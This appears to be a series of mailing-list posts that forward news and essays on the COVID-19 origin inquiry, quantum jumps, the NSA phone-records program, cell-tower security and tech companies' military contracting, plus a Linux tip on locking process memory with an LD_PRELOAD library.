Still, in a vacuum of information, conspiracy theories have taken hold, with President Donald Trump — who has repeatedly referred to SARS-CoV-2 as the “Chinese virus” — a proponent of the lab hypothesis. He said as early as April that China may have [“knowingly”]( unleashed the pathogen, and the U.S. has criticized the country’s lack of cooperation on tracing its source. For its part, China defends its work with the WHO. It’s engaged with the body on origin-tracing in a ``transparent’’ manner and WHO experts have been allowed to visit the country, Wang Wenbin, a foreign ministry spokesman, told reporters this month.
Field, who’s also a science and policy adviser for EcoHealth Alliance, a New York-based nonprofit that works to prevent viral outbreaks around the world, said it’s possible Chinese scientists are well advanced in their investigations, but fears any findings into how the virus originated — whether from China or elsewhere — will be clouded in “conspiracy cover-up talk.”
“How do we make those broadly accepted to what now seems to be quite a cynical and politicized audience?”
It will likely require a level of openness China is showing no signs of embracing.
On a recent visit to the Wuhan Institute of Virology, security staff tried to stop a Bloomberg journalist from taking photographs and video from a public road outside. One guard stood in the way of the car until police arrived. Multiple requests to visit the infectious diseases lab were denied.
Outside the city’s Battle Against Covid-19 exhibition, there are no restrictions on filming. Visitors take photos of each other popping their heads out of wooden silhouettes with holes in place of faces, the kind you see of cartoon characters at theme parks, though here it’s doctors in protective suits and gloves.
Yang Feng, a 51-year-old retiree, said she found the exhibit cathartic, a reminder of everything her home town had been through, from the almost three-month lockdown to the 3,869 people who died. “I wanted to recap the history,” she said. “Now, you can’t tell Wuhan is a city that’s been through the virus.”
But Yang shakes her head when asked where she thinks Covid-19 originated.
“I don’t know,” she said. “I really don’t know.”

"... there is more to the story of discreteness, randomness and predictability in quantum mechanics than commonly thought.”
New Views of Quantum Jumps Challenge Core Tenets of Physics
One of the most basic processes in all of nature—a subatomic particle’s transition between discrete energy states—is surprisingly complex and sometimes predictable, recent work shows
- By [Eleni Petrakou]( on December 29, 2020
Quantum mechanics, the theory that describes the physics of the universe at very small scales, is notorious for defying common sense. Consider, for instance, the way that standard interpretations of the theory suggest change occurs in the quantum turf: shifts from one state to another supposedly happen unpredictably and instantaneously. Put another way, if events in our familiar world unfolded similarly to those within atoms, we would expect to routinely see batter becoming a fully baked cake without passing through any intermediate steps. Everyday experience, of course, tells us this is not the case, but for the less accessible microscopic realm, the true nature of such “quantum jumps” has been a major unsolved problem in physics.
In recent decades, however, technological advancements have allowed physicists to probe the issue more closely in carefully arranged laboratory settings. The most fundamental breakthrough arguably came in 1986, when researchers for the first time experimentally verified that quantum jumps are actual physical events that can be observed and studied. Ever since, steady technical progress has opened deeper vistas upon the mysterious phenomenon. Notably, [an experiment]( published in 2019 overturned the traditional view of quantum jumps by demonstrating that they move predictably and gradually once they start—and can even be stopped midway.
That experiment, performed at Yale University, used a setup that let the researchers monitor the transitions with minimal intrusion. Each jump took place between two energy values of a superconducting qubit, a tiny circuit built to mimic the properties of atoms. The research team used measurements of “side activity” taking place in the circuit when the system had the lower energy. This is a bit like knowing which show is playing on a television in another room by only listening for certain key words. This indirect probe evaded one of the top concerns in quantum experiments—namely, how to avoid influencing the very system that one is observing. Known as “clicks” (from the sound that old Geiger counters made when detecting radioactivity), these measurements revealed an important property: jumps to the higher energy were always preceded by a halt in the “key words,” a pause in the side activity. This eventually permitted the team to predict the jumps’ unfolding and even to stop them at will.
Now a new theoretical study delves deeper into what can be said about the jumps and when. And it finds that this seemingly simple and fundamental phenomenon is actually quite complex.
CATCH ME IF YOU CAN
The [new study]( published in Physical Review Research, models the step-by-step, cradle-to-grave evolution of quantum jumps—from the initial lower-energy state of the system, known as the ground state, then a second one where it has higher energy, called the excited state, and finally the transition back to the ground state. This modeling shows that the predictable, “catchable” quantum jumps must have a noncatchable counterpart, says author Kyrylo Snizhko, a postdoctoral researcher now at Karlsruhe Institute of Technology in Germany, who was formerly at the Weizmann Institute of Science in Israel, where the study was performed.
Specifically, by “noncatchable” the researchers mean that the jump back to the ground state will not always be smooth and predictable. Instead the study’s results show that such an event’s evolution depends on how “connected” the measuring device is to the system (another peculiarity of the quantum realm, which, in this case, relates to the timescale of the measurements, compared with that of the transitions). The connection can be weak, in which case a quantum jump can also be predictable through the pause in clicks from the qubit’s side activity, in the way used by the Yale experiment.
The system transitions by passing through a mixture of the excited state and ground state, a quantum phenomenon known as superposition. But sometimes, when the connection exceeds a certain threshold, this superposition will shift toward a specific value of the mixture and tend to stay at that state until it moves to the ground unannounced. In that special case, “this probabilistic quantum jump cannot be predicted and reversed midflight,” explains Parveen Kumar, a postdoctoral researcher at the Weizmann Institute and co-author of the most recent study. In other words, even jumps for which timing was initially predictable would be followed by inherently unpredictable ones.
But there is yet more nuance when examining the originally catchable jumps. Snizhko says that even these possess an unpredictable element. A catchable quantum jump will always proceed on a “trajectory” through the superposition of the excited and ground states, but there can be no guarantee that the jump will ever finish. “At each point in the trajectory, there is a probability that the jump continues and a probability that it is projected back to the ground state,” Snizhko says. “So the jump may start happening and then abruptly get canceled. The trajectory is totally deterministic—but whether the system will complete the trajectory or not is unpredictable.”
This behavior appeared in the Yale experiment’s results. The scientists behind that work called such catchable jumps “islands of predictability in a sea of uncertainty.” Ricardo Gutiérrez-Jáuregui, a postdoctoral researcher at Columbia University and one of the authors of the corresponding study, notes that “the beauty of that work was to show that in the absence of clicks, the system followed a predetermined path to reach the excited state in a short but nonzero time. The device, however, still has a chance to ‘click’ as the system transitions through this path, thus interrupting its transition.”
“QUANTUM PHYSICS IS BROKEN!”
Zlatko Minev, a researcher at the IBM Thomas J. Watson Research Center and lead author of the earlier Yale study, notes that the new theoretical paper “derives a very nice, simple model and explanation of the quantum jump phenomenon in the context of a qubit as a function of the parameters of the experiment.” Taken together with the experiment at Yale, the results “show that there is more to the story of discreteness, randomness and predictability in quantum mechanics than commonly thought.” Specifically, the surprisingly nuanced behavior of quantum jumps—the way a leap from the ground state to the excited state can be foretold—suggests a degree of predictability inherent to the quantum world that has never before been observed. Some would even consider it forbidden, had it not already been validated by experiment. When Minev first discussed the possibility of predictable quantum jumps with others in his group, a colleague responded by shouting back, “If this is true, then quantum physics is broken!”
“In the end, our experiment worked, and from it one can infer that quantum jumps are random and discrete,” Minev says. “Yet on a finer timescale, their evolution is coherent and continuous. These two seemingly opposed viewpoints coexist.”
As to whether such processes can apply to the material world at large—for instance, to atoms outside a quantum lab—Kumar is undecided, in large part because of how carefully specific the study’s conditions were. “It would be interesting to generalize our results,” he says. If the results turn out similar for different measurement setups, then this behavior—events that are in some sense both random and predictable, discrete yet continuous—could reflect more general properties of the quantum world.
Meanwhile the predictions of the study could get checked soon. According to Serge Rosenblum, a researcher at the Weizmann Institute who did not participate in either study, these effects can be observed with today’s state-of-the-art superconducting quantum systems and are high on the list of experiments for the institute’s new [qubits lab]( “It was quite amazing to me that a deceptively simple system such as a single qubit can still hide such surprises when we measure it,” he adds.
For a long time, quantum jumps—the most basic processes underlying everything in nature—were considered nearly impossible to probe. But technological progress is changing that. Kater Murch, an associate professor at Washington University in St. Louis, who did not participate in the two studies, remarks, “I like how the Yale experiment seems to have motivated this theory paper, which is uncovering new aspects of a physics problem that has been studied for decades. In my mind, experiments really help drive the ways that theorists think about things, and this leads to new discoveries.”
The mystery might not just be going away, though. As Snizhko says, “I do not think that the quantum jumps problem will be resolved completely any time soon; it is too deeply ingrained in quantum theory. But by playing with different measurements and jumps, we might stumble upon something practically useful.”

N.S.A. Phone Program Cost $100 Million, but Produced Only Two Unique Leads
A disputed program that allowed the National Security Agency to gain access to logs of Americans’ domestic calls and texts yielded only one significant investigation, according to a newly declassified study.
By Charlie Savage
    Feb. 25, 2020
WASHINGTON — A National Security Agency system that analyzed logs of Americans’ domestic phone calls and text messages cost $100 million from 2015 to 2019, but yielded only a single significant investigation, according to a newly declassified study.
Moreover, only twice during that four-year period did the program generate unique information that the F.B.I. did not already possess, said the study, which was produced by the Privacy and Civil Liberties Oversight Board and briefed to Congress on Tuesday.
“Based on one report, F.B.I. vetted an individual, but, after vetting, determined that no further action was warranted,” the report said. “The second report provided unique information about a telephone number, previously known to U.S. authorities, which led to the opening of a foreign intelligence investigation.”
The report did not reveal the subject matter of the one significant F.B.I. investigation that was spurred by the Freedom Act program, and it did not divulge its outcome.
But the high expense and low utility of the call records collected sheds new light on the National Security Agency’s decision in 2019 to shutter the program amid recurring technical headaches, halting a counterterrorism effort that has touched off disputes about privacy and the rule of law since the Sept. 11, 2001, attacks.
The information surfaced as Congress was weighing whether to allow the law that authorizes the agency to operate the system — the USA Freedom Act of 2015 — to expire on March 15, or whether to accede to the Trump administration’s request that lawmakers extend the statute, so the agency could choose to turn the system back on in the future.
The House Judiciary Committee will meet on Wednesday to consider a draft bill that would adjust surveillance law in several ways, including terminating the program’s authority. Separately on Tuesday, Attorney General William P. Barr met with Republican senators to urge them to extend three other investigative powers also set to expire on March 15.
The privacy board is an independent agency created by Congress on the recommendation of the commission that studied the Sept. 11 attacks. A declassified, partly censored version of the board’s 103-page report was obtained by The New York Times.
In an interview, the board’s chairman, Adam I. Klein, praised the National Security Agency for deciding last year to suspend the program — not only because of its high cost and low value, but because of continuing problems in which telecommunications companies kept sending the agency more people’s phone records than it had legal authority to collect.
“It shows a lot of judgment to acknowledge that something that consumed a lot of resources and time did not yield the value anticipated,” Mr. Klein said. “We want agencies to be able to reflect on their collection capabilities and wind them down where appropriate. That’s the best way to ensure civil liberties and privacy are balanced with operational needs.”
In a statement appended to the report, Mr. Klein also noted that phone records were becoming less important as people shifted to using encrypted chat apps. And, he noted, the government could still gain access to some phone logs through other means, like traditional subpoenas for records of discrete accounts, or N.S.A. collection abroad, where there are fewer legal limits.
The Times reported last year that the National Security Agency had delivered a bleak internal assessment of the call records program’s steep costs and minimal benefits without taking an explicit position on whether the Trump administration should seek to extend the law that authorized it. But the specific figures undergirding that briefing were previously classified.
The privacy board, working with the intelligence community, got several additional salient facts declassified as part of the rollout of its report. Among them, it officially disclosed that the system has gained access to Americans’ cellphone records, not just logs of landline phone calls.
It also disclosed that in the four years the Freedom Act system was operational, the National Security Agency produced 15 intelligence reports derived from it. The other 13, however, contained information the F.B.I. had already collected through other means, like ordinary subpoenas to telephone companies.
The report cited two investigations in which the National Security Agency produced reports derived from the program: its analysis of the Pulse nightclub mass shooting in Orlando, Fla., in June 2016 and of a February 2016 incident in Ohio where a man attacked people at a restaurant with a machete. But it did not say whether the investigations into either of those attacks were connected to the two intelligence reports that provided unique information not already in the possession of the F.B.I.
The system traces back to a secret decision by President George W. Bush to unleash the National Security Agency from certain legal constraints after the Sept. 11 attacks. Among other things, the agency began collecting customer calling records in bulk from several large telecoms. Counterterrorism analysts used the data as a map of social links, hunting for hidden associates of known terrorism suspects by looking at indirect connections.
In 2006, the Foreign Intelligence Surveillance Court secretly blessed the program under a legally disputed interpretation of the Patriot Act. In 2013, the program’s existence was leaked by the former National Security Agency contractor Edward J. Snowden, prompting an uproar over privacy rights and the rule of law.
Defenders of the program claimed that it could have stopped the Sept. 11 attacks. But in practice, its most concrete accomplishment, according to a 2014 report by the Privacy and Civil Liberties Oversight Board, was leading the F.B.I. to scrutinize a San Diego man who turned out to have donated several thousand dollars to the Shabab, the Islamist group in Somalia. There was no accusation that he was planning to a terrorist attack.
In 2015, Congress enacted the USA Freedom Act, which ended the bulk collection of phone records under the Patriot Act, but authorized the National Security Agency to operate an alternative system that kept the bulk records in the hands of phone companies.
With a judge’s permission, the agency could query the system to swiftly obtain the records not only of a suspect, but of everyone with whom that suspect had been in contact.
The exponential math meant that the agency was still gathering a huge number of call and text records about Americans, however. In 2018, the agency obtained 14 court orders, but gathered 434 million call detail records involving 19 million phone numbers.
There were repeated signs of trouble. In spring 2018, the National Security Agency purged hundreds of millions of records after it realized that its database was contaminated with some files the agency had no authority to receive. And in fall 2018, it discovered again that it was overcollecting data. The agency turned off the program in 2019.
The agency has said that the cause of the problems was largely that telecoms were returning erroneous call records. The unclassified version of the privacy board’s report adds a few details to that discussion, but sections about exactly what went wrong remain blacked out.
Mr. Klein said that after the agency’s staff worked with the intelligence community to get large amounts of information declassified, the board met with Joseph Maguire, the former acting director of national intelligence, to ask for four more things to be made public.
Mr. Maguire agreed to declassify one — that the program had cost taxpayers $100 million — but three others remain secret despite the board’s request. Among them, Mr. Klein said, were additional details about what kinds of records the program did and did not collect, about the cause of the compliance problems with the telecoms and about how the agency processed the data.

The telecom and tech industries could overcome these challenges if they decided to prioritize a fix. That's a big if. Nasser points to a solution that would [function a lot like HTTPS web encryption]( allowing phones to quickly check cell tower "certificates" to prove their legitimacy before establishing a secure connection. Last year, Hussain and colleagues from Purdue and the University of Iowa [developed and proposed]( such an authentication scheme for the bootstrapping process in 5G.
"As long as phones will connect to anything advertising itself as a tower, it’s kind of free-for-all," Nasser says. "This problem is big low-hanging fruit, and there are many ways things could get better I think."
never gonna happen :(

E.g. and of course, you could expand on the various malicious attacks possible against DHT's by a reasonably resourced attacker - this is the Achilles's heel of DHTs!  DoS is trivial, targeted attacks hard to detect, reputation easily gamed, etc. etc.

@_subject: minimizing buffer size (i.e. page cache) for bulk copy/rsync -- 
‐‐‐‐‐‐‐ Original Message ‐‐‐‐‐‐‐
[ paraphrasing: page cache gets swamped by bulk copy, driving interactive desktop applications to heavy latency... ]
use an LD_PRELOAD hack to force mlock() on the apps you want to keep interactive:
If you have the sources for the program, add a command-line option so that the program calls mlockall(MCL_CURRENT | MCL_FUTURE) at some point. That locks it in memory.
If you want to control the address spaces the kernel loads the program into, you need to delve into kernel internals. Most likely, there is no reason to do so; only people with really funky hardware would.
If you don't have the sources, or don't want to recompile the program, then you can create a dynamic library that executes the command, and inject it into the process via LD_PRELOAD.
Save the following as lockall.c:
     static void wrerr(const char *p)
    if (p) {
        const char *q = p + strlen(p);
        ssize_t     n;
        while (p < q) {
            n = write(STDERR_FILENO, p, (size_t)(q - p));
            if (n > 0)
                p += n;
            else
            if (n != -1 || errno != EINTR)
                return;
        }
    }
static void init(void) __attribute__((constructor));
static void init(void)
    int saved_errno = errno;
    if (mlockall(MCL_CURRENT | MCL_FUTURE) == -1) {
        const char *errmsg = strerror(errno);
        wrerr("Cannot lock all memory: ");
        wrerr(errmsg);
        wrerr(".\n");
        exit(127);
    } else
        wrerr("All memory locked.\n");
    errno = saved_errno;
Compile it to a dynamic library liblockall.so using
gcc -Wall -O2 -fPIC -shared lockall.c -Wl,-soname,liblockall.so -o liblockall.so
Install the library somewhere typical, for example
sudo install -o 0 -g 0 -m 0664 liblockall.so /usr/lib/
so you can run any binary, and lock it into memory, using
LD_PRELOAD=liblockall.so binary arguments..
If you install the library somewhere else (not listed in /etc/ld.so.conf), you'll need to specify path to the library, like
LD_PRELOAD=/usr/lib/liblockall.so binary arguments..
Typically, you'll see the message Cannot lock all memory: Cannot allocate memory. printed by the interposed library, when running commands as a normal user. (The superuser, or root, typically has no such limit.) This is because for obvious reasons, most Linux distributions limit the amount of memory an unprivileged user can lock into memory; this is the RLIMIT_MEMLOCK resource limit. Run ulimit -l to see the per-process resource limits currently set (for the current user, obviously).
I suggest you set a suitable limit of how much memory the process can run, running e.g. ulimit -l 16384 bash-built-in before executing the (to set the limit to 16384*1024 bytes, or 16 MiB), if running as superuser (root). If the process leaks memory, instead of crashing your machine (because it locked all available memory), the process will die (from SIGSEGV) if it exceeds the limit. That is, you'd start your process using
ulimit -l 16384
LD_PRELOAD=/usr/lib/liblockall.so binary arguments..
if using Bash or dash shell.
If running as a dedicated user, most distributions use the pam_limits.so PAM module to set the resource limits "automatically". The limits are listed either in the /etc/security/limits.conf file, or in a file in the /etc/security/limits.d/ subdirectory, using this format; the memlock item specifies the amount of memory each process can lock, in units of 1024 bytes. So, if your service runs as user mydev, and you wish to allow the user to lock up to 16 megabytes = 16384*1024 bytes per process, then add line mydev - memlock 16384 into /etc/security/limits.conf or /etc/security/limits.d/mydev.conf, whichever your Linux distribution prefers/suggests.
Prior to PAM, shadow-utils were used to control the resource limits. The memlock resource limit is specified in units of 1024 bytes; a limit of 16 megabytes would be set using M16384. So, if using shadow-utils instead of PAM, adding line mydev M16384 (followed by whatever the other limits you wish to specify) to /etc/limits should do the trick.

@_subject: Reports of a Silicon Valley/Military Divide Have Been Greatly 
Reports of a
Silicon Valley/Military Divide
Have Been Greatly Exaggerated
Jack Poulson July 7, 2020
We performed an in-depth analysis of all public US federal (sub)contracting [data]( over the last four and a half years to estimate the rankings of tech companies, both in and out of Silicon Valley, as contractors with the military, law enforcement, and diplomatic arms of the United States.
Inspired by [Mijente]( [groundbreaking report]( on the US tech companies supporting the [Immigration and Customs Enforcement]( (ICE) agency of the [Department of Homeland Security]( (DHS), we also ranked contractors with the [Justice Department]( [Department of Defense]( (DoD), [State Department]( [Agency for International Development]( (AID), and [Agency for Global Media]( (AGM).
We hope to address the alarmist claims from the [Chairman of the Joint Chiefs of Staff]( and [corporate executives]( that a tech company -- namely, Google -- electing to not directly contribute to weapons systems is ["treasonous"]( and part of a divide between Silicon Valley and the US military that is a ["national-security threat"]( [1, 2, 3]
We separately address:
- The implication that defense contracting is rare in Silicon Valley -- the capacity question, [4] and
- That the Department of Defense appears to only [publicly criticize]( U.S. tech companies [facilitating]( [authoritarian]( [suppression]( of [dissent]( as a means of demanding that they [contract]( with the Department of Defense -- the human rights question.
The Alleged Silicon Valley/Military Divide: Capacity
Our analysis shows a diversity of contracting postures (see Tables [2]( and [3]( not a systemic divide from Washington. Within a substantial list of namebrand tech companies, only Facebook, Apple, and Twitter look to be staying out of major military and law enforcement contracts. [5, 6]
The accusations of treason stemmed from Google's 2018 release of its [worker]( [AI Principles]( because one of the principles involved a commitment to not building weapons systems, Google promised to not renew its contract providing custom-built drone object tracking AI for a [Joint Artificial Intelligence Center]( (JAIC) pathfinder project (Maven). [7, 8] Months later, the company cited potential conflicts with their AI Principles, along with their [missing]( government certifications, as their motivations for walking away from the [Joint Enterprise Defense Infrastructure]( cloud competition. The missing certifications, as well as the near-certainty that the award would go to Amazon or Microsoft, indicated that Google was not so much exiting federal cloud contracting as limiting embarrassment from a loss.
This intuition was later born out through the company's deep involvement with the Department of Defense's efforts to include Artificial Intelligence / Machine Learning in the modernization of its battle networks: the [Defense Innovation Initiative]( [9] Google's former CEO, Eric Schmidt, has chaired two of its components since their inception: the [Defense Innovation Board]( (DIB) and the [National Security Commission on AI]( (NSCAI). And, in May, Google Cloud [poached]( the Executive Director of the DIB and then landed a [secure cloud contract]( through its sibling, the [Defense Innovation Unit]( (DIU). [10, 11] On balance, Google's position became supporting the DoD's cloud and cybersecurity while avoiding direct contributions to weapons systems. [12]
Federal procurement data also suggests, contrary to popular [narrative]( that [Palantir]( and [Anduril]( are, financially speaking, modest players in the defense contracting space relative to Hewlett Packard (especially its [spinoff]( [Perspecta]( IBM, Microsoft, Dell Technologies, AT&T, Verizon, and Amazon. Even [Accenture]( through [Accenture Federal Services]( and [Johns Hopkins University]( through its [Applied Physics Laboratory]( rank substantially higher within the studied DoD and DHS agencies. [13]
We conclude that the US weapons and intelligence community dramatically overreacted to a prominent tech company democratically deciding to not contribute to weapons systems. [14] In July 2019, as part of the [Aspen Security Forum]( Defense Innovation Unit director Michael Brown [stated]( that coverage of Maven was "overblown" before pointing out that many tech companies, namely Amazon and Microsoft, understand that workplaces should not be democracies and that
The namebrand tech companies, universities, and tech-oriented traditional defense contractors, by and large, appear to be willing and able to modernize US battle networks. [18]
The Alleged Silicon Valley/Military Divide: Human Rights
We argue that two of the primary tech defense contractors, [Microsoft]( and [IBM]( helped normalize their industry's suppression of human rights in exchange for market access. Despite the human rights [messaging]( of Microsoft's head lawyer and [lobbyist]( the company has proactively [suppressed]( dissent in Bing for more than a decade, and its subsidiary, LinkedIn, is [infamous]( for doing the same; in early 2010 Bill Gates [pointedly criticized]( Google for -- as it turns out, [temporarily]( -- taking a principled stand for human rights. [19] IBM's ["safe city"]( products are known to have involved a video surveillance system for strongman Rodrigo Duterte in [Davao City]( And IBM's CEO having [directly led]( sales of cataloguing equipment for Nazi Germany, which directly contributed to the Holocaust, is [still defended]( by the company.
Similarly, [Perspecta]( a close Hewlett Packard affiliate/spin-off that dominates our chart of tech defense contractors, incorporates components of both [Computer Sciences Corporation]( which [helped charter]( CIA rendition flights to secret prisons, and QinetiQ North America. [QinetiQ]( the [privatization]( of England's former [Defense Evaluation and Research Agency]( has had former CIA Chief who [personally authorized]( his agency's use of torture on its [board]( [20]
Another tech defense contractor, [Cisco]( has been [in court]( since 2013 for not only [helping]( custom-build China's ["Golden Shield"]( project -- commonly known as the ["Great Firewall of China"]( -- but even [purpose-building]( a censorship, video surveillance, and "forced conversion" module for suppressing a dissident religious minority. Some of Cisco's internal marketing materials mentioning this work even [leaked]( the day before a Senate human rights hearing. And despite Google's 2010-2018 [public]( [stance]( against suppressing dissent, Google's former CEO, and primary interface to the DoD, Eric Schmidt, has [defended]( complying with authoritarian demands [since 2006]( [21]
Companies and executives which comply with authoritarian demands are only openly criticized by the US national security community if they do not significantly interface with the DoD. When they are willing to partner with the DoD, as is the case with [Eric Schmidt]( and [Reid Hoffman]( they are [welcomed]( as [leaders](
Data Availability
Alongside this report, we are officially releasing the initial version of our procurement and lobbying explorer: techinquiry.org/lobbying/. In addition to providing summaries of over one hundred thousand companies' procurement and lobbying behavior, and lists of heavy-hitter vendors for over 100 government agencies, it includes custom [nearest-neighbor]( utilities for finding lesser-known analogues of contractors.
Our manual curation of the noisy FPDS data is also made public in [JavaScript Object Notation]( (JSON) via:
- More than 9000 [company name normalizations](
- Roughly 5000 [corporate parentage links](
- More than 5000 [explanatory websites]( and
- More than 650 [contracting/requesting agency normalizations](
And since this work was sparked by a need to understand federal procurement data well enough to properly [submit]( [Freedom of Information]( requests for contracts, we are also releasing the responses to our requests. They involve three tech companies (two based in Silicon Valley):
- A [redacted contract]( with Virginia-based [Transvoyant]( for the Air Force to test Transvoyant's software for a "Precise Predictive Logistics (P2L) Pilot" meant to produce a "LOGistics Common Operating Picture (LOGCOP)". The deliverables include:
- "Situational (unit readiness, weapon system status) and battlespace (intelligence, political climates, adversary actions, weather) awareness in real-time and continuous" [emphasis ours],
- "Visibility of missions (centralized repairs, supply chain, distribution networks) and operations (contingency and steady state) globally", and
- "[The] ability to plan for operations now or anytime in the future, allows planners to adapt to dynamic situations that arise during currents operations and develop courses of actions (COAs)."
- A [redacted contract]( with [Palantir USG, Inc.]( for the Air Force to test Palantir's Gotham software for "Supply Chain Visualization and Analytics" to produce a "LOGistics Common Operating Picture (LOGCOP)".
- The last response involves [Pivotal Software]( -- a [Dell Technologies]( subsidiary -- which is the largest recipient of funds from the Defense Innovation Unit. Pivotal's work on [modernizing]( the Air Force's Air Operations Centers has been widely publicized, often alongside the tongue-in-cheek hashtag [" While this FOI request, along with the other two, was submitted in September of 2019, the responsive documents for Pivotal are expected to arrive in the first half of July. Once they arrive, we will link to them here.
Lastly, we make public our lists of annotated subcontract award summaries, which we describe in detail in a [later section](
Analyzing Direct Contracting
This project began with the submission of [a large number]( of [Freedom of Information]( (FOI) requests, through the [Office of the Secretary of Defense]( for contracts relating to Silicon Valley's role in the [Defense Innovation Initiative]( Intermediate responses made clear that at least a passing familiarity with the [Federal Procurement Data System]( was required. And due to the extended wait times, high redaction rates, and low response rates, we decided that a detailed study of the [hundreds of gigabytes]( of federal procurement awards might prove intrinsically valuable, in addition to improving our ability to target future FOI requests.
While [Tech Inquiry]( is entirely made up of tech workers, roughly our first year was spent pointedly avoiding the common pitfall of assuming that change is best achieved by throwing up a website and writing software. But such an acknowledgement of the centrality of organizing and communications should not prevent detailed curation and analysis of datasets that allow us to [study up]( such as databases of [corporate registrations]( [corporate lobbying and political contributions]( or, in the case of this report, military and law enforcement contracting.
Given that the author previously built recommendation systems for a major tech company, one of our first questions was whether the FPDS award data was rich enough to allow for the automatic retrieval of answers to questions of the form: "Which companies contract like Palantir?". As it turns out, the answer is yes -- we discuss our system for producing nearest neighbors of FPDS vendors in a [later section]( But, through our own usage of our tool, we found the following, more basic, questions to typically be more important:
- What are all of the names a particular company is listed under?
- Who are the parent and child companies -- if any -- of this company?
- What is an informative website associated with this company?
- What is this company's address and latitude/longitude? And is there an associated phone number?
- Which agencies does a particular company primarily contract with? And how much money have they received from each?
- Which companies (perhaps including all of their subsidiaries) receive the most money from a particular agency?
- What are the most recent awards received by a particular company?
- What are the biggest awards ever received by a particular company?
- What is the parent award, if any, of a particular award? Or, from the opposite perspective: what are the subawards?
- Which awards contained a particular phrase (e.g., "facial recognition" or "aws govcloud")? And what vendors and agencies were they associated with?
- Who are the subcontractors of a particular company? And how much money did they receive from subcontracting?
Of all of these questions, the last turns out to be the most critical -- and, by far, the most laborious -- for understanding tech defense contracting, and we delay its discussion to a later section. The others can be fairly quickly answered in each instance through the curation of a[Postgres]( database of [geocoded]( FPDS award data with an associated interface (in our case, techinquiry.org/lobbying/).
But it is helpful for us to take a step back and briefly review the context of US federal procurement data before diving into the structure of the associated data feed and how we extract answers to our above questions from it.
Overview of the Federal Procurement Data System and its Curation
For an in-depth overview of the roots of U.S. federal procurement, dating back to the Revolutionary War, we highly recommend [The U.S. Federal Procurement System: An Introduction]( by Christopher R. Yukins. But this report only involves the [Federal Procurement Data System]( (FPDS), which, since 2010, has been [run by IBM]( through the [General Services Administration]( At roughly 1:30AM ET each day, anywhere from 10,000 to 100,000 new award modification summaries are made available through an [ATOM feed]( provided by the official source for FPDS data, fpds.gov. [22]
While FPDS is the definitive source for US federal procurement data, it is known to have numerous shortcomings, such as inconsistencies and and inaccuracies in award amounts, slow and incomplete uploads from contract officers (including 90 day delays for DoD procurement), and corrections frequently taking place years after the signing data. The [Government Accountability Office]( (GAO) issued [a report]( in late 2019 covering many such shortcomings.
One of the more delicate issues is that FPDS integrates the proprietary [Data Universal Numbering System]( (DUNS), an assignment of a nine digit number to each business entity. Beyond accuracy and precision issues associated with DUNS, bulk dissemination of FPDS data is [alleged]( to violate the intellectual property of the owner of the data, [Dun & Bradstreet]( [23] As a result, we avoid overreliance on DUNS information (which includes some information on parent companies) and manually maintain our own vendor name [normalizations]( and corporate [parentage]( hierarchies.
Anatomy of an FPDS Award
To give a concrete example of what type of data exists in the FPDS ATOM feed, a boiled down version of the JSON equivalent of the October 2019 JEDI award, which went to Microsoft, is shown in [Figure 1](

Figure 1: A small, relevant subset of a JSON translation of the official FPDS XML (via the python [xmltodict]( module) for the original award to Microsoft for the [Joint Enterprise Defense Infrastructure]( (JEDI) contract.
We can read off a number of useful conclusions from this -- again, truncated -- snippet:
- The [Procurement Instrument IDentifier]( (PIID) for JEDI is HQ0034-20-D-0001.
- The original JEDI award was signed, and also made effective, on October 25, 2019. Whereas the last modification to this original award was October 31, 2019 (and an email address associated with the modifier is provided).
- There is no legally [obligated amount]( whereas the potential value of the contract, if all options become exercised, is $10B.
- The award was contracted through the [Washington Headquarters Service]( but was requested by the DoD's [Chief Information Officer]( (as it happens, later awards moved the requesting agency down to the [Defense Information Systems Agency](
- The official description of the award is to provide:
- Microsoft's listed address is:
and their listed phone number is (571) 353-2701. While the address of large companies, such as Microsoft, is readily available, aggregated lists for obscure contractors are somewhat rare. This consistent source for company addresses is behind our ability to show maps of geocoded headquarters for the vast majority of federal contractors.
- Microsoft's associated DUNS number is 081466849, and it has no listed parent company (technically, the award lists its parent as itself).
- The award is claimed to have undergone a full, open competition that received 7 offers.
We underline that, on a typical day, between twenty and thirty thousand new award summaries are made public via the[FPDS]( ATOM feed.
Three Measures of Contract Value
One of the significant complications in analyzing federal procurement is that there is no straight-forward answer for how to measure money-flow. One of the best such examples is the above [JEDI award]( which reports a minimum, or ["obligated"]( award amount of zero, and a ["base and all options"]( -- or "potential" -- value of ten billion dollars. That is to say, the minimum amount of the award was set to zero, and the maximum amount was set to ten billion, and the actual value could be anywhere in the middle. This was pointedly [explained]( by the Department of Defense's Chief Information Officer, [Dana Deasy](
To understand a possible source for the million dollar floor on the contract value, we incorporate two further complications:
- Awards often cannot be analyzed in isolation -- they can have both modification awards (using the same PIID) and subawards (which reference the original award's PIID).
- There are not just lower and upper bounds on contract values -- the "obligated" amount and "potential", a.k.a. ["base and all options"]( value -- but also a typically more accurate lower bound, called the "current", or ["base and exercised options"]( value.
Figure 2: A subaward to the original JEDI award showing all three contract value types as one million dollars.
One of the several subawards to the original JEDI award is shown in [Figure 2]( with each of the three measures of contract value set to the same mysterious one million dollar floor value mentioned by Deasy. But we emphasize that one should not expect FPDS award data to always be correct: a 2017 Government Accountability Office [report]( claimed that less than one percent of awards are fully consistent!
The takeaway should be that, when FPDS award data is consistent, the running totals of the contract values should satisfy the ordering:
In several extreme cases, typically involving DoD contracts run through the GSA's [Federal Acquisition Service]( (FAS), both the "obligated" and "current" contract values are zero, while the "potential" value is almost exactly one trillion dollars.
We therefore argue that it is a serious, qualitative mistake to pick any one of these three contract values as representative. Our approach is to recognize the noise and inconsistency in FPDS data and instead focus on companies' rankings within government agencies when sorted by contract values.
Which contract value should we sort by to determine rankings? We do so for all three, and then take the most significant of the three results -- that is, the highest ranking -- as a numerical indicator of influence of a company on a particular agency. To give a specific example: we measured IBM as the 2nd largest vendor with the DHS's [Customs and Border Protection]( by obligated amount, 3rd largest by current values, and 19th largest by potential values. As a result, we set IBM's influence ranking with CBP as 2nd. By focusing on per-agency rankings, rather than dollar amounts, we help avoid coming to misleading conclusions due to systemic idiosyncrasies and imprecision in agency data.
Normalizing Company Names
Most questions that we would like to investigate involve aggregating large numbers of awards for each vendor, which therefore requires adoption of some form of company identifier. An obvious approach would be to set this to the DUNS number, but, for the accuracy and intellectual property reasons described above, we instead use a specific spelling of the business name (potentially qualified with the state of incorporation) and manually curate a list of corrections from encountered misspellings (possibly restricted to its pairing with a particular DUNS numbers).
